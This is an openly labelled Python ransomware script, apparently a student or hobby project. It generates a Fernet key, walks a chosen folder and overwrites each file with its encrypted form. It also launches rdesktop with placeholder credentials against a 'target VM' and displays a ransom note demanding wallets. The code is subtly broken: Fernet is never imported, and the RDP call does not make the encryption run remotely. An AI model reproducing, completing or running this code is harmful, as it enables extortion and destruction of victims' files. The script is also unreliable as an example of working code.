# Sierra Maldonado
#!/usr/bin/env python3
import os
import subprocess

# Functions to write key and load key
def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("key.key", "rb").read()




class Ransomware:
    def __init__(self):
        self.sysRoot = os.path.expanduser('~')
        if not os.path.exists("key.key"):
            write_key()
        self.key = load_key()

    # Encrypt all files in a folder on a different VM using SSH
    def encrypt_folder_on_vm(self, target_vm_ip, folder_path):
        # Establish RDP connection
        rdp_command = f"rdesktop -u your_username -p your_password {target_vm_ip}"
        subprocess.run(rdp_command, shell=True)

        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    data = f.read()

                fernet = Fernet(self.key)
                encrypted = fernet.encrypt(data)

                with open(file_path, 'wb') as f:
                    f.write(encrypted)

    # Decrypt files using the Fernet symmetric key
    def decrypt_folder_on_vm(self, target_vm_ip, folder_path):
        # Establish RDP connection
        rdp_command = f"rdesktop -u your_username -p your_password {target_vm_ip}"
        subprocess.run(rdp_command, shell=True)

        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    data = f.read()

                fernet = Fernet(self.key)
                decrypted = fernet.decrypt(data)

                with open(file_path, 'wb') as f:
                    f.write(decrypted)

    # Display Ransom Note as Popup on Windows using RDP
    def ransom_note(self):
        # Establish RDP connection
        rdp_command = "rdesktop -u your_username -p your_password target_vm_ip"
        subprocess.run(rdp_command, shell=True)

        ransom_note_text = "You have been bamboozled by the Black Fox Bandits. Please hand over your wallets."
        subprocess.run(f"msg * {ransom_note_text}", shell=True)
            
ransomware = Ransomware()


# Add choices at the bottom
print("Choose an action:")
print("1. Encrypt folder on a different VM")
print("2. Decrypt folder on a different VM")
print("3. Display Ransom Note on Windows")
choice = input("Enter your choice (1/2/3): ")

if choice == "1":
    target_vm_ip = input("Enter the target VM IP: ")
    folder_path = input("Enter the folder path to encrypt: ")
    ransomware.encrypt_folder_on_vm(target_vm_ip, folder_path)
    print("Encryption completed.")
elif choice == "2":
    target_vm_ip = input("Enter the target VM IP: ")
    folder_path = input("Enter the folder path to decrypt: ")
    ransomware.decrypt_folder_on_vm(target_vm_ip, folder_path)
    print("Decryption completed.")
elif choice == "3":
    ransomware.ransom_note()
    print("Ransom note displayed.")
else:
    print("Invalid choice. Please choose a valid option.")
